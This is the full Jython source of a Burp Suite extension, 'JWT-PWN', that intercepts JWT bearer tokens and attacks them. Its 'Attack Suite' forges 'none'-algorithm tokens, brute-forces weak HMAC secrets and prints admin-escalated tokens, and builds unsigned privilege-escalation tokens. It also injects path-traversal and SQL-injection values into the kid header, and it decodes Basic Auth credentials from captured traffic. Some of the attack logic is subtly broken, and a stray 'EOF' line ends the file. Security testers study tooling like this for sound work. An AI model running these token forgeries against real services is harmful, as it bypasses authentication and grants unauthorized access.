# JWT-PWN Burp Suite Extension
# Load via Extender > Extensions > Add > Python > select this file
# Requires: Jython 2.7+ standalone JAR configured in Extender > Options

from burp import IBurpExtender, ITab, IHttpListener, IContextMenuFactory
from javax.swing import (JPanel, JButton, JTextArea, JLabel, JScrollPane,
                          JSplitPane, JTabbedPane, BoxLayout, JCheckBox,
                          JMenuItem, BorderFactory, SwingConstants, JTable,
                          JTextField)
from javax.swing.table import DefaultTableModel
from java.awt import BorderLayout, Color, Font, Dimension, GridBagLayout, GridBagConstraints, Insets
import base64
import hashlib
import hmac as hmac_lib
import json
import time
import re
import sys

# ── helpers ──────────────────────────────────────────────────────────────────

def b64url_decode(s):
    s = s.replace('-','+').replace('_','/')
    pad = 4 - len(s) % 4
    if pad != 4: s += '=' * pad
    return base64.b64decode(s)

def b64url_encode(b):
    return base64.b64encode(b).decode().replace('+','-').replace('/','_').rstrip('=')

def parse_jwt(token):
    token = token.strip()
    parts = token.split('.')
    if len(parts) != 3: return None
    try:
        header  = json.loads(b64url_decode(parts[0]).decode('utf-8','replace'))
        payload = json.loads(b64url_decode(parts[1]).decode('utf-8','replace'))
        return header, payload, parts[2], parts
    except:
        return None

def build_jwt(header, payload, secret='', algorithm=None):
    if algorithm: header = dict(header); header['alg'] = algorithm
    h = b64url_encode(json.dumps(header, separators=(',',':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
    signing_input = ('%s.%s' % (h, p)).encode()
    alg = header.get('alg','none').upper()
    if alg in ('NONE','') or not secret:
        return '%s.%s.' % (h, p)
    hf = hashlib.sha256 if alg=='HS256' else hashlib.sha384 if alg=='HS384' else hashlib.sha512
    sig = hmac_lib.new(secret.encode(), signing_input, hf).digest()
    return '%s.%s.%s' % (h, p, b64url_encode(sig))

WEAK_SECRETS = [
    "secret","password","123456","jwt","token","admin","changeme",
    "mysecret","secretkey","your-256-bit-secret","development","test","",
]

NONE_VARIANTS = ['none','None','NONE','nOnE','noNe']

# ── Extension ─────────────────────────────────────────────────────────────────

class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers   = callbacks.getHelpers()
        callbacks.setExtensionName("JWT-PWN")
        
        # Build UI
        self._panel = self._build_ui()
        callbacks.addSuiteTab(self)
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        self._log("JWT-PWN loaded. Paste a token or intercept a request.")
    
    def _log(self, msg):
        self._output_area.append("[*] %s\n" % msg)

    # ── ITab ─────────────────────────────────────────────────────────────────
    
    def getTabCaption(self): return "JWT-PWN"
    def getUiComponent(self): return self._panel

    # ── IHttpListener ────────────────────────────────────────────────────────

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest: return
        request = messageInfo.getRequest()
        analyzed = self._helpers.analyzeRequest(request)
        headers = analyzed.getHeaders()
        for header in headers:
            if header.lower().startswith('authorization: bearer '):
                token = header[len('authorization: bearer '):]
                parsed = parse_jwt(token)
                if parsed:
                    self._token_field.setText(token)
                    self._log("JWT intercepted from request — loaded into analyzer")
                    break

    # ── Context Menu ─────────────────────────────────────────────────────────

    def createMenuItems(self, invocation):
        items = []
        item = JMenuItem("Send to JWT-PWN")
        def send(e):
            msgs = invocation.getSelectedMessages()
            if msgs:
                req = msgs[0].getRequest()
                analyzed = self._helpers.analyzeRequest(req)
                for h in analyzed.getHeaders():
                    if h.lower().startswith('authorization: bearer '):
                        t = h[len('authorization: bearer '):]
                        self._token_field.setText(t)
                        self._do_analyze(None)
                        break
        item.addActionListener(send)
        items.append(item)
        return items

    # ── UI Builder ────────────────────────────────────────────────────────────

    def _build_ui(self):
        panel = JPanel(BorderLayout())
        panel.setBackground(Color(18, 18, 18))
        
        # Title
        title = JLabel("  JWT-PWN  |  Auth Header Analyzer + Attack Suite", SwingConstants.LEFT)
        title.setFont(Font("Monospaced", Font.BOLD, 14))
        title.setForeground(Color(0, 230, 200))
        title.setBackground(Color(10, 10, 10))
        title.setOpaque(True)
        title.setPreferredSize(Dimension(0, 36))
        panel.add(title, BorderLayout.NORTH)

        # Tabs
        tabs = JTabbedPane()
        tabs.setFont(Font("Monospaced", Font.PLAIN, 12))
        tabs.setBackground(Color(24, 24, 24))
        tabs.setForeground(Color(200, 200, 200))
        tabs.addTab("Analyzer", self._build_analyzer_tab())
        tabs.addTab("Attack Suite", self._build_attack_tab())
        tabs.addTab("Forge Token", self._build_forge_tab())
        panel.add(tabs, BorderLayout.CENTER)
        return panel

    def _make_text_area(self, rows=8):
        ta = JTextArea(rows, 60)
        ta.setFont(Font("Monospaced", Font.PLAIN, 12))
        ta.setBackground(Color(28, 28, 28))
        ta.setForeground(Color(220, 220, 220))
        ta.setCaretColor(Color(0, 230, 200))
        ta.setBorder(BorderFactory.createLineBorder(Color(60, 60, 60)))
        return ta

    def _make_button(self, text, action):
        btn = JButton(text)
        btn.setFont(Font("Monospaced", Font.BOLD, 12))
        btn.setBackground(Color(0, 150, 130))
        btn.setForeground(Color.WHITE)
        btn.addActionListener(action)
        btn.setFocusPainted(False)
        return btn

    def _build_analyzer_tab(self):
        p = JPanel(BorderLayout())
        p.setBackground(Color(18,18,18))

        top = JPanel()
        top.setLayout(BoxLayout(top, BoxLayout.Y_AXIS))
        top.setBackground(Color(18,18,18))

        lbl = JLabel("JWT Token or Authorization Header:")
        lbl.setForeground(Color(150,150,150))
        lbl.setFont(Font("Monospaced", Font.PLAIN, 11))
        top.add(lbl)

        self._token_field = self._make_text_area(4)
        top.add(JScrollPane(self._token_field))

        btn_row = JPanel()
        btn_row.setBackground(Color(18,18,18))
        btn_row.add(self._make_button("Analyze JWT", self._do_analyze))
        btn_row.add(self._make_button("Analyze Headers", self._do_analyze_headers))
        btn_row.add(self._make_button("Clear", lambda e: (self._token_field.setText(""), self._output_area.setText(""))))
        top.add(btn_row)
        p.add(top, BorderLayout.NORTH)

        self._output_area = self._make_text_area(20)
        self._output_area.setEditable(False)
        p.add(JScrollPane(self._output_area), BorderLayout.CENTER)
        return p

    def _build_attack_tab(self):
        p = JPanel(BorderLayout())
        p.setBackground(Color(18,18,18))

        top = JPanel()
        top.setLayout(BoxLayout(top, BoxLayout.Y_AXIS))
        top.setBackground(Color(18,18,18))

        lbl = JLabel("Token to Attack (or uses token from Analyzer tab):")
        lbl.setForeground(Color(150,150,150))
        lbl.setFont(Font("Monospaced", Font.PLAIN, 11))
        top.add(lbl)

        self._attack_token = self._make_text_area(3)
        top.add(JScrollPane(self._attack_token))

        self._cb_none = JCheckBox("None Algorithm", True)
        self._cb_none.setForeground(Color(200,200,200)); self._cb_none.setBackground(Color(18,18,18))
        self._cb_brute = JCheckBox("Brute Force Secret", True)
        self._cb_brute.setForeground(Color(200,200,200)); self._cb_brute.setBackground(Color(18,18,18))
        self._cb_privesc = JCheckBox("Privilege Escalation Payloads", True)
        self._cb_privesc.setForeground(Color(200,200,200)); self._cb_privesc.setBackground(Color(18,18,18))
        self._cb_kid = JCheckBox("KID Injection", True)
        self._cb_kid.setForeground(Color(200,200,200)); self._cb_kid.setBackground(Color(18,18,18))

        cb_row = JPanel()
        cb_row.setBackground(Color(18,18,18))
        for cb in [self._cb_none, self._cb_brute, self._cb_privesc, self._cb_kid]:
            cb_row.add(cb)
        top.add(cb_row)

        btn_row = JPanel()
        btn_row.setBackground(Color(18,18,18))
        btn_row.add(self._make_button("Run All Attacks", self._do_attack))
        top.add(btn_row)
        p.add(top, BorderLayout.NORTH)

        self._attack_output = self._make_text_area(20)
        self._attack_output.setEditable(False)
        p.add(JScrollPane(self._attack_output), BorderLayout.CENTER)
        return p

    def _build_forge_tab(self):
        p = JPanel(BorderLayout())
        p.setBackground(Color(18,18,18))

        top = JPanel()
        top.setLayout(BoxLayout(top, BoxLayout.Y_AXIS))
        top.setBackground(Color(18,18,18))

        for label_text, attr in [
            ("Original Token:", "_forge_token"),
            ("Secret (leave empty for none-alg):", "_forge_secret"),
            ("Claims JSON to override (e.g. {\"role\":\"admin\"}):", "_forge_claims"),
        ]:
            lbl = JLabel(label_text)
            lbl.setForeground(Color(150,150,150))
            lbl.setFont(Font("Monospaced", Font.PLAIN, 11))
            top.add(lbl)
            ta = self._make_text_area(3 if 'Token' in label_text else 2)
            setattr(self, attr, ta)
            top.add(JScrollPane(ta))

        btn_row = JPanel()
        btn_row.setBackground(Color(18,18,18))
        btn_row.add(self._make_button("Forge Token", self._do_forge))
        top.add(btn_row)
        p.add(top, BorderLayout.NORTH)

        self._forge_output = self._make_text_area(10)
        self._forge_output.setEditable(False)
        p.add(JScrollPane(self._forge_output), BorderLayout.CENTER)
        return p

    # ── Actions ──────────────────────────────────────────────────────────────

    def _do_analyze(self, e):
        token = self._token_field.getText().strip()
        # Extract JWT if it's a full header line
        if token.lower().startswith('authorization:'):
            token = token.split(':', 1)[1].strip()
            if token.lower().startswith('bearer '):
                token = token[7:].strip()
        
        parsed = parse_jwt(token)
        self._output_area.setText("")
        if not parsed:
            self._output_area.setText("[!] Not a valid JWT\n"); return
        
        header, payload, sig, parts = parsed
        out = []
        out.append("=" * 60)
        out.append("JWT ANALYSIS")
        out.append("=" * 60)
        out.append("\nHEADER:")
        out.append(json.dumps(header, indent=2))
        out.append("\nPAYLOAD:")
        out.append(json.dumps(payload, indent=2))
        
        alg = header.get('alg','?')
        out.append("\nSECURITY FLAGS:")
        flags = [
            ("Algorithm", alg, alg.upper()=='NONE' or alg.upper().startswith('HS')),
            ("KID header", header.get('kid','absent'), 'kid' in header),
            ("JKU header", header.get('jku','absent'), 'jku' in header),
            ("Expired", str(_is_expired(payload)), _is_expired(payload)),
            ("Privilege claims", str(_has_priv_claims(payload)), _has_priv_claims(payload)),
        ]
        for name, val, bad in flags:
            icon = "[!]" if bad else "[+]"
            out.append("  %s %s: %s" % (icon, name, val))
        
        self._output_area.setText("\n".join(out))
        # Copy to attack tab
        self._attack_token.setText(self._token_field.getText().strip())

    def _do_analyze_headers(self, e):
        raw = self._token_field.getText().strip()
        out = ["="*60, "HEADER ANALYSIS", "="*60]
        found = False
        for line in raw.splitlines():
            hl = line.lower()
            if hl.startswith('authorization:'):
                val = line.split(':',1)[1].strip()
                if val.lower().startswith('bearer '):
                    token = val[7:].strip()
                    out.append("\n[HIGH] JWT Bearer Token detected")
                    parsed = parse_jwt(token)
                    if parsed:
                        out.append("  Algorithm: %s" % parsed[0].get('alg','?'))
                        out.append("  Claims: %s" % list(parsed[1].keys()))
                elif val.lower().startswith('basic '):
                    try:
                        creds = base64.b64decode(val[6:]).decode()
                        out.append("\n[CRITICAL] Basic Auth: %s" % creds)
                    except:
                        out.append("\n[CRITICAL] Basic Auth detected (decode failed)")
                found = True
            elif any(h in hl for h in ['x-api-key:','x-auth-token:','api-key:']):
                out.append("\n[MEDIUM] API Key header: %s" % line)
                found = True
        if not found:
            out.append("\n[INFO] No auth headers detected in input")
        self._output_area.setText("\n".join(out))

    def _do_attack(self, e):
        token = self._attack_token.getText().strip()
        if not token:
            token = self._token_field.getText().strip()
        parsed = parse_jwt(token)
        if not parsed:
            self._attack_output.setText("[!] Invalid JWT\n"); return
        
        header, payload, sig, parts = parsed
        out = ["="*60, "JWT ATTACK RESULTS", "="*60]

        if self._cb_none.isSelected():
            out.append("\n[1] NONE ALGORITHM VARIANTS:")
            for variant in NONE_VARIANTS:
                h2 = dict(header); h2['alg'] = variant
                forged = build_jwt(h2, payload, "", variant)
                out.append("  alg=%s:" % variant)
                out.append("  %s\n" % forged)

        if self._cb_brute.isSelected():
            out.append("\n[2] BRUTE FORCE RESULTS:")
            cracked = None
            signing_input = ('%s.%s' % (parts[0], parts[1])).encode()
            alg = header.get('alg','').upper()
            if alg.startswith('HS'):
                hf = hashlib.sha256 if alg=='HS256' else hashlib.sha384 if alg=='HS384' else hashlib.sha512
                for s in WEAK_SECRETS:
                    computed = hmac_lib.new(s.encode(), signing_input, hf).digest()
                    try:
                        if hmac_lib.compare_digest(computed, b64url_decode(parts[2])):
                            cracked = s; break
                    except: continue
                if cracked is not None:
                    out.append("  [!!!] SECRET FOUND: \"%s\"" % cracked)
                    p2 = dict(payload); p2['role']='admin'; p2['is_admin']=True
                    out.append("  Escalated token: %s" % build_jwt(dict(header), p2, cracked))
                else:
                    out.append("  [+] No weak secret found in built-in list")
            else:
                out.append("  [!] Not HMAC — skipping")

        if self._cb_privesc.isSelected():
            out.append("\n[3] PRIVILEGE ESCALATION PAYLOADS (unsigned):")
            for changes in [{'role':'admin'},{'is_admin':True},{'admin':True}]:
                p2 = dict(payload); p2.update(changes)
                forged = build_jwt(dict(header), p2)
                out.append("  %s: %s..." % (list(changes.keys())[0], forged[:80]))

        if self._cb_kid.isSelected():
            out.append("\n[4] KID INJECTION:")
            if 'kid' in header:
                for label, inj in [("../dev/null","../../dev/null"),("SQLi","' UNION SELECT 'x'--")]:
                    h2 = dict(header); h2['kid'] = inj
                    forged = build_jwt(h2, payload, "", header.get('alg','HS256'))
                    out.append("  %s: %s..." % (label, forged[:80]))
            else:
                out.append("  [+] No kid header present")

        self._attack_output.setText("\n".join(out))

    def _do_forge(self, e):
        token = self._forge_token.getText().strip()
        secret = self._forge_secret.getText().strip()
        claims_raw = self._forge_claims.getText().strip()
        parsed = parse_jwt(token)
        if not parsed:
            self._forge_output.setText("[!] Invalid JWT\n"); return
        header, payload, _, _ = parsed
        new_payload = dict(payload)
        if claims_raw:
            try:
                overrides = json.loads(claims_raw)
                new_payload.update(overrides)
            except:
                self._forge_output.setText("[!] Invalid JSON for claims\n"); return
        forged = build_jwt(dict(header), new_payload, secret)
        out = ["="*60, "FORGED TOKEN", "="*60,
               "\nHeader:  %s" % json.dumps(header),
               "Payload: %s" % json.dumps(new_payload),
               "\n" + forged]
        self._forge_output.setText("\n".join(out))

def _is_expired(payload):
    exp = payload.get('exp')
    return isinstance(exp, int) and exp < int(time.time())

def _has_priv_claims(payload):
    return any(k in payload for k in ('role','roles','is_admin','admin','privilege'))
EOF
